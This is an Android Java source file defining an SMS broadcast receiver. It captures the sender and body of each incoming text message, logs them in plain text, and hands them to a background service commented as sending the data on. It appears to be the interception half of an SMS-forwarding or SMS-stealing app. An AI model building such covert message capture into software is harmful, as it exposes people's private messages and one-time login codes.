package com.secureconnection;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "SmsReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent != null && intent.getAction() != null &&
                intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {

            Bundle extras = intent.getExtras();
            if (extras == null) return;

            Object[] pdus = (Object[]) extras.get("pdus");
            if (pdus == null || pdus.length == 0) return;

            StringBuilder messageBody = new StringBuilder();
            String sender = null;

            for (Object pdu : pdus) {
                SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                if (sender == null) {
                    sender = smsMessage.getDisplayOriginatingAddress();
                }
                messageBody.append(smsMessage.getMessageBody());
            }

            if (sender != null) {
                Log.d(TAG, "Received SMS from: " + sender + " | Message: " + messageBody);

                // Start background service to send data
                Intent serviceIntent = new Intent(context, SmsService.class);
                serviceIntent.putExtra("sender", sender);
                serviceIntent.putExtra("message", messageBody.toString());
                context.startService(serviceIntent);
            }
        }
    }
}
